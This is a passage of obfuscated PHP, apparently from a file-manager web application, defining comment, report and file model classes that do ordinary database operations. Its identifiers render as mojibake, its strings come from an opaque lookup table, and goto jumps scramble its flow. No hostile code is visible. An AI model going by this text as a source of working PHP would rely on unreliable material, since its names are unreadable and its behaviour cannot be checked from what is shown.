cŞóÅºñÍÚ: $CêøĞê‡÷ =& $_SERVER[‘®…¢À]; if (is_array($A‚õØ„ÁŒ)) { $A‚õØ„ÁŒ = array($CêøĞê‡÷[7], $A‚õØ„ÁŒ); } $A¶™ùŞˆïˆ = array($CêøĞê‡÷[436] => $A‚õØ„ÁŒ); goto d¾ôº‰»Ö“; Dî¶‹¼¤Ö: } protected function removeBySource($dç…ƒç) { goto DÇÜ¨‹ïŠ; AˆÓ´¸µÅ»: $this->where($Eö–»çñ)->delete(); Model($d»¾ÓàÎÁË[528])->where($Eö–»çñ)->delete(); goto eÀ­ğá½ °; DÇÜ¨‹ïŠ: $d»¾ÓàÎÁË =& $_SERVER[‘®…¢À]; $Eö–»çñ = array($d»¾ÓàÎÁË[379] => array($d»¾ÓàÎÁË[380], $dç…ƒç)); $d¢×‡æŸ†ë = $this->field($d»¾ÓàÎÁË[436])->where($Eö–»çñ)->select(); goto Bš°·’ÖÈà; Bš°·’ÖÈà: $d¢×‡æŸ†ë = array_to_keyvalue($d¢×‡æŸ†ë, $d»¾ÓàÎÁË[33], $d»¾ÓàÎÁË[436]); if (!$d¢×‡æŸ†ë) { return; } $Eö–»çñ = array($d»¾ÓàÎÁË[435] => array($d»¾ÓàÎÁË[380], $d¢×‡æŸ†ë)); goto AˆÓ´¸µÅ»; eÀ­ğá½ °: } public function listAll($bÁ¤åÜ¯«) { goto b©²”Š˜; aºÀÚÖÍç: $fšèêƒÛ· = $this->_makeOrder()->where($A©“‡…³î)->selectPage(20); if (empty($fšèêƒÛ·[$e­ˆ™‘çš[350]])) { return array(); } $this->_listDataApply($fšèêƒÛ·[$e­ˆ™‘çš[350]]); goto E¼‰»ƒ‚; b©²”Š˜: $e­ˆ™‘çš =& $_SERVER[‘®…¢À]; $A©“‡…³î = array(); if ($bÁ¤åÜ¯«[$e­ˆ™‘çš[1337]]) { $A©“‡…³î[$e­ˆ™‘çš[1337]] = $bÁ¤åÜ¯«[$e­ˆ™‘çš[1337]]; } goto CÄºè‘è­Ø; E¼‰»ƒ‚: return $fšèêƒÛ·; goto FÒÑ™ƒ¦ãÏ; CÄºè‘è­Ø: if ($bÁ¤åÜ¯«[$e­ˆ™‘çš[675]]) { $eØî’¬±° = $bÁ¤åÜ¯«[$e­ˆ™‘çš[676]] ? $bÁ¤åÜ¯«[$e­ˆ™‘çš[676]] : strtotime(date($e­ˆ™‘çš[2134])); $A©“‡…³î[$e­ˆ™‘çš[184]] = array($e­ˆ™‘çš[318], array($bÁ¤åÜ¯«[$e­ˆ™‘çš[675]], $eØî’¬±°)); } if ($bÁ¤åÜ¯«[$e­ˆ™‘çš[29]]) { $A©“‡…³î[$bÁ¤åÜ¯«[$e­ˆ™‘çš[29]]] = 1; } else { $A©“‡…³î[] = array($e­ˆ™‘çš[441] => array($e­ˆ™‘çš[907], 0), $e­ˆ™‘çš[443] => array($e­ˆ™‘çš[907], 0), $e­ˆ™‘çš[2113] => $e­ˆ™‘çš[2082]); } if ($bÁ¤åÜ¯«[$e­ˆ™‘çš[2078]]) { $A©“‡…³î[] = array($e­ˆ™‘çš[438] => $bÁ¤åÜ¯«[$e­ˆ™‘çš[2078]], $e­ˆ™‘çš[1234] => array($e­ˆ™‘çš[734], "\x25{$bÁ¤åÜ¯«[$e­ˆ™‘çš[2078]]}\x25"), $e­ˆ™‘çš[2113] => $e­ˆ™‘çš[2082]); } goto aºÀÚÖÍç; FÒÑ™ƒ¦ãÏ: } private function _listDataApply(&$dÇç¯ÜÍ“) { $DÁç¾Œˆ«¤ =& $_SERVER[‘®…¢À]; $AÑ®Çè¥àÚ = array_to_keyvalue($dÇç¯ÜÍ“, $DÁç¾Œˆ«¤[33], $DÁç¾Œˆ«¤[1337]); $cÃÙ†š÷ËØ = Model($DÁç¾Œˆ«¤[468])->userListInfo(array_unique($AÑ®Çè¥àÚ)); $EØ¼†ì¬ƒâ = array_to_keyvalue($dÇç¯ÜÍ“, $DÁç¾Œˆ«¤[33], $DÁç¾Œˆ«¤[365]); $fõ¬ÒËî´İ = Model($DÁç¾Œˆ«¤[735])->sourceListInfo($EØ¼†ì¬ƒâ, !0); foreach ($dÇç¯ÜÍ“ as &$A£áÃ‚£âƒ) { $CÈ˜’“§ù¢ = $A£áÃ‚£âƒ[$DÁç¾Œˆ«¤[1337]]; $A£áÃ‚£âƒ[$DÁç¾Œˆ«¤[2135]] = $cÃÙ†š÷ËØ[$CÈ˜’“§ù¢] ? $cÃÙ†š÷ËØ[$CÈ˜’“§ù¢] : !1; $A¬òº÷ÄÊ = $A£áÃ‚£âƒ[$DÁç¾Œˆ«¤[365]]; $A£áÃ‚£âƒ[$DÁç¾Œˆ«¤[387]] = $fõ¬ÒËî´İ[$A¬òº÷ÄÊ] ? $fõ¬ÒËî´İ[$A¬òº÷ÄÊ] : !1; } } private function _makeOrder($D™ö“½šá´ = '') { goto DÏŸ²™Ã¢Ç; B¤ÃçàØ¿Ø: $D™ö“½šá´ = $D™ö“½šá´ . "{$b¯‡†ê–ƒ}\40{$eÍäãÌö‰ˆ}"; return $this->order($D™ö“½šá´); goto d—à“æï«á; DÏŸ²™Ã¢Ç: $f˜õŸ—Éô… =& $_SERVER[‘®…¢À]; $Bç†È—”·¢ = array($f˜õŸ—Éô…[184], $f˜õŸ—Éô…[676], $f˜õŸ—Éô…[2125], $f˜õŸ—Éô…[2126]); $cŠØ“õÚâ… = array($f˜õŸ—Éô…[397] => $f˜õŸ—Éô…[398], $f˜õŸ—Éô…[399] => $f˜õŸ—Éô…[400]); goto aôéƒ¢××; aôéƒ¢××: $b¯‡†ê–ƒ = Input::get($f˜õŸ—Éô…[402], $f˜õŸ—Éô…[7], $f˜õŸ—Éô…[385], $Bç†È—”·¢); $eÍäãÌö‰ˆ = Input::get($f˜õŸ—Éô…[403], $f˜õŸ—Éô…[7], $f˜õŸ—Éô…[2136], array($f˜õŸ—Éô…[2077], $f˜õŸ—Éô…[399])); $eÍäãÌö‰ˆ = $cŠØ“õÚâ…[$eÍäãÌö‰ˆ]; goto B¤ÃçàØ¿Ø; d—à“æï«á: } public function reportAdd($fÁ«õ¹£Ã) { $C‘¤Ÿˆõœğ =& $_SERVER[‘®…¢À]; $FÊèöİµ‚í = array($C‘¤Ÿˆõœğ[436] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[436]], $C‘¤Ÿˆõœğ[1337] => USER_ID); if (Model($C‘¤Ÿˆõœğ[2137])->where($FÊèöİµ‚í)->find()) { return !1; } $aÜîìÅ„öÏ = array($C‘¤Ÿˆõœğ[436] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[436]], $C‘¤Ÿˆõœğ[1234] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[1234]], $C‘¤Ÿˆõœğ[365] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[365]], $C‘¤Ÿˆõœğ[414] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[414]], $C‘¤Ÿˆõœğ[1337] => USER_ID, $C‘¤Ÿˆõœğ[29] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[29]], $C‘¤Ÿˆõœğ[400] => $fÁ«õ¹£Ã[$C‘¤Ÿˆõœğ[400]]); return Model($C‘¤Ÿˆõœğ[2137])->add($aÜîìÅ„öÏ); } public function reportList($DùöĞ«È) { goto EÒ„¶Œëˆ—; aà¬¼£‚í‘: if (isset($DùöĞ«È[$bô¦–ôØã[29]]) && in_array($DùöĞ«È[$bô¦–ôØã[29]], array($bô¦–ôØã[84], $bô¦–ôØã[2138], $bô¦–ôØã[2139], $bô¦–ôØã[2140], $bô¦–ôØã[1817]))) { $Cä´à…ÌÁ[$bô¦–ôØã[29]] = $DùöĞ«È[$bô¦–ôØã[29]]; } if (isset($DùöĞ«È[$bô¦–ôØã[662]]) && in_array($DùöĞ«È[$bô¦–ôØã[662]], array($bô¦–ôØã[463], $bô¦–ôØã[84], $bô¦–ôØã[2138], $bô¦–ôØã[2139]))) { $Cä´à…ÌÁ[$bô¦–ôØã[662]] = $DùöĞ«È[$bô¦–ôØã[662]]; } $BõËÙÜ ¢˜ = Input::get($bô¦–ôØã[403], $bô¦–ôØã[7], $bô¦–ôØã[2136], array($bô¦–ôØã[2077], $bô¦–ôØã[399])); goto D—è©†­’‚; B£åç—Ÿ: if (empty($C‚ œ°æº[$bô¦–ôØã[350]])) { return array(); } $this->_listDataApply($C‚ œ°æº[$bô¦–ôØã[350]]); return $C‚ œ°æº; goto cöÍ’ä™Á; D—è©†­’‚: $CÌ£õÌ„÷ì = array($bô¦–ôØã[397] => $bô¦–ôØã[398], $bô¦–ôØã[399] => $bô¦–ôØã[400]); $föº³º†‰ = $bô¦–ôØã[2141] . $CÌ£õÌ„÷ì[$BõËÙÜ ¢˜]; $C‚ œ°æº = Model($bô¦–ôØã[2137])->where($Cä´à…ÌÁ)->order($föº³º†‰)->selectPage(20); goto B£åç—Ÿ; EÒ„¶Œëˆ—: $bô¦–ôØã =& $_SERVER[‘®…¢À]; $Cä´à…ÌÁ = array(); if ($DùöĞ«È[$bô¦–ôØã[675]]) { $aÚ´±Ê‡Øã = $DùöĞ«È[$bô¦–ôØã[676]] ? $DùöĞ«È[$bô¦–ôØã[676]] : strtotime(date($bô¦–ôØã[2134])); $Cä´à…ÌÁ[$bô¦–ôØã[184]] = array($bô¦–ôØã[318], array($DùöĞ«È[$bô¦–ôØã[675]], $aÚ´±Ê‡Øã)); } goto aà¬¼£‚í‘; cöÍ’ä™Á: } public function reportStatus($AóååÂ‡õ) { goto aöš£ÛĞË›; aöš£ÛĞË›: $cÑ¯¶Ú•Ã =& $_SERVER[‘®…¢À]; $DŞŞÔ„µä = array($cÑ¯¶Ú•Ã[363] => $AóååÂ‡õ[$cÑ¯¶Ú•Ã[363]]); $dÒõŒ‹µàŠ = Model($cÑ¯¶Ú•Ã[2137])->where($DŞŞÔ„µä)->field($cÑ¯¶Ú•Ã[2142])->find(); goto dÓô¥†åİö; dÓô¥†åİö: if (!$dÒõŒ‹µàŠ) { return !1; } $c°†“ò†¿ = array($cÑ¯¶Ú•Ã[662] => $AóååÂ‡õ[$cÑ¯¶Ú•Ã[662]]); if ($AóååÂ‡õ[$cÑ¯¶Ú•Ã[662]] == $cÑ¯¶Ú•Ã[2139] && $dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[662]] == $cÑ¯¶Ú•Ã[2139]) { $c°†“ò†¿[$cÑ¯¶Ú•Ã[662]] = 0; } goto C‰íê£; C‰íê£: $A¦ÒóÒäµÁ = Model($cÑ¯¶Ú•Ã[2137])->where($DŞŞÔ„µä)->save($c°†“ò†¿); if ($AóååÂ‡õ[$cÑ¯¶Ú•Ã[662]] == $cÑ¯¶Ú•Ã[2138]) { if ($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[414]] != $cÑ¯¶Ú•Ã[463] && $this->shareFileMeta($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[414]])) { $this->shareFileMeta($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[414]], 0); } return $this->remove($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[436]]); } if ($A¦ÒóÒäµÁ && $AóååÂ‡õ[$cÑ¯¶Ú•Ã[662]] == $cÑ¯¶Ú•Ã[2139]) { $cŒ™Ò†¾õ = $c°†“ò†¿[$cÑ¯¶Ú•Ã[662]] == $cÑ¯¶Ú•Ã[2139] ? 1 : 0; $this->shareFileMeta($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[414]], $cŒ™Ò†¾õ); $this->removeByFile($dÒõŒ‹µàŠ[$cÑ¯¶Ú•Ã[414]]); } goto A†±±®æ†ˆ; A†±±®æ†ˆ: return $A¦ÒóÒäµÁ; goto d”æ‰²Ğ¡š; d”æ‰²Ğ¡š: } private function removeByFile($dÕ½õç›´¯) { goto EÇØ«ˆ‹®£; cŞÆğÁ…Ü: $B‘ìàÖ‰Ø = array($DÆ¶ÏŒ»š­[365] => array($DÆ¶ÏŒ»š­[7], $C·â”Ç¯‹½), $DÆ¶ÏŒ»š­[441] => 1); $cĞ´âøˆ¥Â = Model($DÆ¶ÏŒ»š­[1977])->where($B‘ìàÖ‰Ø)->field($DÆ¶ÏŒ»š­[436])->select(); $dºõ¼©ÜëÚ = array_to_keyvalue($cĞ´âøˆ¥Â, $DÆ¶ÏŒ»š­[33], $DÆ¶ÏŒ»š­[436]); goto B¹†¤»èÂğ; EÇØ«ˆ‹®£: $DÆ¶ÏŒ»š­ =& $_SERVER[‘®…¢À]; $cĞ´âøˆ¥Â = Model($DÆ¶ÏŒ»š­[735])->where(array($DÆ¶ÏŒ»š­[414] => $dÕ½õç›´¯))->field($DÆ¶ÏŒ»š­[365])->select(); $C·â”Ç¯‹½ = array_to_keyvalue($cĞ´âøˆ¥Â, $DÆ¶ÏŒ»š­[33], $DÆ¶ÏŒ»š­[365]); goto cŞÆğÁ…Ü; B¹†¤»èÂğ: $this->remove($dºõ¼©ÜëÚ); goto fíÃ÷ÍÇ‚½; fíÃ÷ÍÇ‚½: } private function shareFileMeta($D£ ÒÊŞÂĞ, $CÑÚŸÈŠòÃ = null) { $a«”›ŒõÃŠ =& $_SERVER[‘®…¢À]; $C°‡İ‰Çìø = array($a«”›ŒõÃŠ[414] => $D£ ÒÊŞÂĞ, $a«”›ŒõÃŠ[90] => $a«”›ŒõÃŠ[2143]); if (is_null($CÑÚŸÈŠòÃ)) { return Model($a«”›ŒõÃŠ[2144])->where($C°‡İ‰Çìø)->find(); } $C°‡İ‰Çìø[$a«”›ŒõÃŠ[355]] = $CÑÚŸÈŠòÃ; Model($a«”›ŒõÃŠ[2144])->add($C°‡İ‰Çìø, array(), !0); } } goto fä„·Ÿ×›è; dØÂ‘ê½“‘: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\141\x62\154\145\x4e\x61\155\x65" => "\x63\x6f\x6d\x6d\145\x6e\164\x5f\155\x65\164\141", "\x6d\x65\164\141\106\x69\x65\154\x64" => "\x63\157\x6d\x6d\x65\156\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($aéĞİî–ç‡) { $f«½¼¡Œ³ù =& $_SERVER[‘®…¢À]; if ($aéĞİî–ç‡[$f«½¼¡Œ³ù[2028]]) { $aîÏ ôÇ’Ê = $this->where(array($f«½¼¡Œ³ù[2029] => $aéĞİî–ç‡[$f«½¼¡Œ³ù[2028]]))->find(); if (!$aîÏ ôÇ’Ê || $aîÏ ôÇ’Ê[$f«½¼¡Œ³ù[367]] != $aéĞİî–ç‡[$f«½¼¡Œ³ù[367]] || $aîÏ ôÇ’Ê[$f«½¼¡Œ³ù[451]] != $aéĞİî–ç‡[$f«½¼¡Œ³ù[451]]) { return !1; } $this->where(array($f«½¼¡Œ³ù[2029] => $aéĞİî–ç‡[$f«½¼¡Œ³ù[2028]]))->setAdd($f«½¼¡Œ³ù[2030], 1); } return $this->add($aéĞİî–ç‡); } public function remove($a®Š”º«—ì) { $FÉ£Â¸…åê =& $_SERVER[‘®…¢À]; $eÆã‡×ÊÌÁ = array($FÉ£Â¸…åê[2029] => $a®Š”º«—ì); $BÄÔ‹£Îğ¥ = $this->where($eÆã‡×ÊÌÁ)->find(); if ($BÄÔ‹£Îğ¥[$FÉ£Â¸…åê[2028]]) { $this->where(array($FÉ£Â¸…åê[2029] => $BÄÔ‹£Îğ¥[$FÉ£Â¸…åê[2028]]))->setAdd($FÉ£Â¸…åê[2030], -1); } return $this->where($eÆã‡×ÊÌÁ)->delete(); } public function edit($C°Ÿ´ìØ£, $E¢õ†»­ª) { $eËŸÏŠÙ =& $_SERVER[‘®…¢À]; $DßªÄŸåø¶ = array($eËŸÏŠÙ[2029] => $C°Ÿ´ìØ£); return $this->where($DßªÄŸåø¶)->save(array($eËŸÏŠÙ[2031] => $E¢õ†»­ª)); } public function prasise($bÓÉŠëÂÌÌ) { $AÊŠ‘ƒé¼Ñ =& $_SERVER[‘®…¢À]; $E›±–ÓÕÈ— = Model($AÊŠ‘ƒé¼Ñ[2032]); $EÇ¬‘‰½Åô = array($AÊŠ‘ƒé¼Ñ[2029] => $bÓÉŠëÂÌÌ, $AÊŠ‘ƒé¼Ñ[1328] => USER_ID); $fí÷Ğ È = $E›±–ÓÕÈ—->where($EÇ¬‘‰½Åô)->find(); if (!$fí÷Ğ È) { $E›±–ÓÕÈ—->add($EÇ¬‘‰½Åô); $FêĞ„³Àí½ = $this->where(array($AÊŠ‘ƒé¼Ñ[2029] => $bÓÉŠëÂÌÌ))->setAdd($AÊŠ‘ƒé¼Ñ[2033], 1); } else { $E›±–ÓÕÈ—->where($EÇ¬‘‰½Åô)->delete(); $FêĞ„³Àí½ = $this->where(array($AÊŠ‘ƒé¼Ñ[2029] => $bÓÉŠëÂÌÌ))->setAdd($AÊŠ‘ƒé¼Ñ[2033], -1); } return $FêĞ„³Àí½; } public function targetInfo($cË…àå”Ø, $cÄƒÜØÁ¬Ğ) { goto CÃìù£ºöô; CÃìù£ºöô: $Cƒ‰¸‹ÈŒ =& $_SERVER[‘®…¢À]; $e‰çİ­Éìß = array($Cƒ‰¸‹ÈŒ[512] => $cË…àå”Ø, $Cƒ‰¸‹ÈŒ[513] => $cÄƒÜØÁ¬Ğ); $B­ï·¡÷¹  = $this->where($e‰çİ­Éìß)->count(); goto AÔçÒÌÓÖÔ; AÔçÒÌÓÖÔ: $fÔá¶ôƒá = "\x52\x49\x47\x48\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\155\x6d\145\x6e\x74\137\160\162\x61\151\163\145\40\163\164\141\x72\40\157\x6e\x20\x63\157\x6d\155\145\x6e\x74\x2e\x63\157\x6d\x6d\145\156\164\x49\x44\x20\x3d\x20\163\164\x61\x72\56\x63\157\155\155\x65\156\x74\111\104"; $aèƒëğå¡ = $this->alias($Cƒ‰¸‹ÈŒ[337])->where($e‰çİ­Éìß)->join($fÔá¶ôƒá, $Cƒ‰¸‹ÈŒ[2034])->count(); $B¼òæĞÇİŞ = array($Cƒ‰¸‹ÈŒ[2035] => $B­ï·¡÷¹ , $Cƒ‰¸‹ÈŒ[2036] => $aèƒëğå¡); goto FŞŒË†¿; FŞŒË†¿: return $B¼òæĞÇİŞ; goto dÄ¢„ÆÂéÃ; dÄ¢„ÆÂéÃ: } public function listData($d¯¬Œóí¶¾) { $cĞÁğÓª‚Š =& $_SERVER[‘®…¢À]; if (isset($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2037]])) { if ($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2037]]) { $d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2038]] = array($cĞÁğÓª‚Š[909], intval($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2037]])); } unset($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2037]]); } if (isset($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2039]])) { if ($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2039]]) { $d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2038]] = array($cĞÁğÓª‚Š[906], intval($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2039]])); } unset($d¯¬Œóí¶¾[$cĞÁğÓª‚Š[2039]]); } return $this->_listData($d¯¬Œóí¶¾); } private function _listData($D¿‰Ã‚¨‡‡) { $C‰»‰¨øµ =& $_SERVER[‘®…¢À]; $CÎàìŠÍÉ  = $this->where($D¿‰Ã‚¨‡‡)->_makeOrder()->selectPage(100); $this->_listAppendParent($CÎàìŠÍÉ [$C‰»‰¨øµ[350]]); $this->_listAppendUser($CÎàìŠÍÉ [$C‰»‰¨øµ[350]]); $this->_listAppendMeta($CÎàìŠÍÉ [$C‰»‰¨øµ[350]]); return $CÎàìŠÍÉ ; } private function _makeOrder() { $dÎÛÎÇÄšĞ =& $_SERVER[‘®…¢À]; $B”Œ›†Å†è = array($dÎÛÎÇÄšĞ[2033], $dÎÛÎÇÄšĞ[2030], $dÎÛÎÇÄšĞ[184]); $dÌ‚†öĞ£ = Input::get($dÎÛÎÇÄšĞ[402], $dÎÛÎÇÄšĞ[7], $dÎÛÎÇÄšĞ[385], $B”Œ›†Å†è); $CÓ§ÜùÖ¤ = Input::get($dÎÛÎÇÄšĞ[403], $dÎÛÎÇÄšĞ[7], $dÎÛÎÇÄšĞ[1330], array($dÎÛÎÇÄšĞ[2040], $dÎÛÎÇÄšĞ[400])); $e”öœÕõå = $dÌ‚†öĞ£ . $dÎÛÎÇÄšĞ[50] . $CÓ§ÜùÖ¤; return $this->order($e”öœÕõå); } private function _listAppendParent(&$DÊ‰Óœ±É…) { goto Aö„ ¤­İ„; Aö„ ¤­İ„: $B«´Æà‰Ş =& $_SERVER[‘®…¢À]; $fœ‹ÛóŞ† = array_unique(array_to_keyvalue($DÊ‰Óœ±É…, $B«´Æà‰Ş[33], $B«´Æà‰Ş[2028])); $fœ‹ÛóŞ† = array_remove_value($fœ‹ÛóŞ†, $B«´Æà‰Ş[463]); goto fåòÌğ‘å; E”„Ëª¸¦Á: foreach ($DÊ‰Óœ±É… as &$C•—ãÅ»¨ø) { if (isset($AÒ‘«•Ë¦[$C•—ãÅ»¨ø[$B«´Æà‰Ş[2028]]])) { $C•—ãÅ»¨ø[$B«´Æà‰Ş[2041]] = $AÒ‘«•Ë¦[$C•—ãÅ»¨ø[$B«´Æà‰Ş[2028]]]; } } goto A××†—œ½; fåòÌğ‘å: if (!$fœ‹ÛóŞ†) { return; } $AÒ‘«•Ë¦ = $this->where(array($B«´Æà‰Ş[2029] => array($B«´Æà‰Ş[7], $fœ‹ÛóŞ†)))->select(); $AÒ‘«•Ë¦ = array_to_keyvalue($AÒ‘«•Ë¦, $B«´Æà‰Ş[2038]); goto E”„Ëª¸¦Á; A××†—œ½: } private function _listAppendUser(&$fÖ‡  ¦ù) { goto fÓ±´Úîã; Aî««¿Œø: foreach ($fÖ‡  ¦ù as &$bøÇƒÚ…¾) { $bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[526]] = $e±Îä¹âí[$bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[1337]]]; if (isset($bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[2041]])) { $bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[2041]][$aÏ¯²¥ÎªÍ[526]] = $e±Îä¹âí[$bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[2041]][$aÏ¯²¥ÎªÍ[1337]]]; } } goto e¹è½È¤Õà; fÓ±´Úîã: $aÏ¯²¥ÎªÍ =& $_SERVER[‘®…¢À]; $c£‹ˆöŒ£— = array_unique(array_to_keyvalue($fÖ‡  ¦ù, $aÏ¯²¥ÎªÍ[33], $aÏ¯²¥ÎªÍ[1337])); $c£‹ˆöŒ£— = array_remove_value($c£‹ˆöŒ£—, $aÏ¯²¥ÎªÍ[463]); goto d‚ìáº«è; d‚ìáº«è: if (count($c£‹ˆöŒ£—) == 0) { return; } foreach ($fÖ‡  ¦ù as $bøÇƒÚ…¾) { if (isset($bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[2041]])) { $c£‹ˆöŒ£—[] = $bøÇƒÚ…¾[$aÏ¯²¥ÎªÍ[2041]][$aÏ¯²¥ÎªÍ[1337]]; } } $e±Îä¹âí = Model($aÏ¯²¥ÎªÍ[468])->userListInfo($c£‹ˆöŒ£—); goto Aî««¿Œø; e¹è½È¤Õà: } private function _listAppendMeta(&$b•ÈŠ°²±†) { goto E„¦¹™Ì±ƒ; fÌÈÆæãŒ´: if (!$AÈÀ×­„) { return; } foreach ($b•ÈŠ°²±† as $FÊ¬Ñì†Õ¿) { if (isset($FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2041]])) { $AÈÀ×­„[] = $FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2041]][$D¢Ã¬‹»[2038]]; } } $CŸÖÊ³ó£ = $this->metaList($AÈÀ×­„); goto c†ñ…¯ÖÈ¡; c†ñ…¯ÖÈ¡: if (!$CŸÖÊ³ó£) { return !1; } foreach ($b•ÈŠ°²±† as &$FÊ¬Ñì†Õ¿) { $FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[412]] = $CŸÖÊ³ó£[$FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2038]]]; if (isset($FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2041]])) { $FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2041]][$D¢Ã¬‹»[412]] = $CŸÖÊ³ó£[$FÊ¬Ñì†Õ¿[$D¢Ã¬‹»[2041]][$D¢Ã¬‹»[2038]]]; } } goto Eò±†é©İõ; E„¦¹™Ì±ƒ: $D¢Ã¬‹» =& $_SERVER[‘®…¢À]; $AÈÀ×­„ = array_unique(array_to_keyvalue($b•ÈŠ°²±†, $D¢Ã¬‹»[33], $D¢Ã¬‹»[2038])); $AÈÀ×­„ = array_remove_value($AÈÀ×­„, $D¢Ã¬‹»[463]); goto fÌÈÆæãŒ´; Eò±†é©İõ: } private function metaList($CõŒ˜ÊìÄÜ) { goto cñ²·­ëª; cñ²·­ëª: $dÑÜ´¶Åç =& $_SERVER[‘®…¢À]; if (!$CõŒ˜ÊìÄÜ) { return array(); } $aÖäÒƒîï¯ = array($dÑÜ´¶Åç[2038] => array($dÑÜ´¶Åç[7], $CõŒ˜ÊìÄÜ)); goto E†ĞÜµˆ™Ø; d—‡Ú¥Ÿ: return $FäììÎôî¯ ? $FäììÎôî¯ : array(); goto DƒµÁÒ¯°; E†ĞÜµˆ™Ø: $FäììÎôî¯ = Model($dÑÜ´¶Åç[2042])->where($aÖäÒƒîï¯)->select(); $FäììÎôî¯ = array_to_keyvalue_group($FäììÎôî¯, $dÑÜ´¶Åç[2038]); foreach ($FäììÎôî¯ as $Dé¸¥¢ª => $Cá™¶¯Œ«) { $Cª’Ö¯Áƒ  = array(); foreach ($Cá™¶¯Œ« as $DØÅäïØ¬) { $Cª’Ö¯Áƒ [$DØÅäïØ¬[$dÑÜ´¶Åç[90]]] = $DØÅäïØ¬[$dÑÜ´¶Åç[355]]; } $FäììÎôî¯[$Dé¸¥¢ª] = $Cª’Ö¯Áƒ ; } goto d—‡Ú¥Ÿ; DƒµÁÒ¯°: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\151\154\145"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\141\155\145" => "\151\157\137\x66\151\x6c\x65\137\155\145\x74\141", "\155\145\x74\141\x46\151\x65\154\x64" => "\146\151\154\145\x49\104"); public function fileInfo($e·¢ğØÁïõ) { $d‚ËÑ¥Š¸’ =& $_SERVER[‘®…¢À]; static $c»”ç¸›¶ = array(); if (!isset($c»”ç¸›¶[$e·¢ğØÁïõ])) { $AøÊ¦¸ßê„ = $d‚ËÑ¥Š¸’[2043]; $d¼İ¤¢ğ® = Model($d‚ËÑ¥Š¸’[417])->field($AøÊ¦¸ßê„)->where(array($d‚ËÑ¥Š¸’[415] => $e·¢ğØÁïõ))->find(); $c»”ç¸›¶[$e·¢ğØÁïõ] = $d¼İ¤¢ğ®; } return $c»”ç¸›¶[$e·¢ğØÁïõ]; } public function addFileByContent($fƒÅ›ÄŞò = '', $d÷Á÷ğ = '') { goto cÍë™×Ä…‰; eš¸×Ú®ôÌ: if (file_exists($a¤Œª¦ù™)) { @unlink($a¤Œª¦ù™); } return $cÔ‰óĞ¥¨£; goto eöáÌÉ…Úò; cÍë™×Ä…‰: $dö½ßÎ¼âÔ =& $_SERVER[‘®…¢À]; $a¡¬·éÖğâ = TEMP_PATH . $dö½ßÎ¼âÔ[2044]; if (!is_dir($a¡¬·éÖğâ)) { mk_dir($a¡¬·éÖğâ); } goto DÉ²–£™÷; DÉ²–£™÷: $a¤Œª¦ù™ = $a¡¬·éÖğâ . $dö½ßÎ¼âÔ[2045] . rand_string(16); file_put_contents($a¤Œª¦ù™, $fƒÅ›ÄŞò); $cÔ‰óĞ¥¨£ = $this->addFile($a¤Œª¦ù™, $d÷Á÷ğ, !0); goto eš¸×Ú®ôÌ; eöáÌÉ…Úò: } public function createFileName($aÔÓê½´‹˜) { goto b„©´»ßÖ; b„©´»ßÖ: $e”¯¸Ñ™ëÛ =& $_SERVER[‘®…¢À]; $e¨Å„‡¿¨ = IO::init($e”¯¸Ñ™ëÛ[8]); $fã†«ÂŠŠñ = $this->makeFilePath($aÔÓê½´‹˜, $e¨Å„‡¿¨); goto cóÂôÅÓñÏ; cóÂôÅÓñÏ: $bˆÃÔ¡Œ¾ = $e¨Å„‡¿¨->pathFather($fã†«ÂŠŠñ); static $A¦’¼Û‡ İ = false; $côÒš‘Ù¶ = $e”¯¸Ñ™ëÛ[2046] . md5($bˆÃÔ¡Œ¾); goto C–Æà¬›ºõ; C–Æà¬›ºõ: if (!$A¦’¼Û‡ İ && !Cache::get($côÒš‘Ù¶)) { $A¦’¼Û‡ İ = !0; $b–ˆ¼ò’†Ú = IO::mkdir($bˆÃÔ¡Œ¾); if (!IO::exist($b–ˆ¼ò’†Ú . $e”¯¸Ñ™ëÛ[2047])) { IO::mkfile($b–ˆ¼ò’†Ú . $e”¯¸Ñ™ëÛ[2047]); } Cache::set($côÒš‘Ù¶, 1, 3600 * 2); } return $fã†«ÂŠŠñ; goto DëíÃ¬Ïé¼; DëíÃ¬Ïé¼: } public function makeFilePath($dÖóœÅµé , 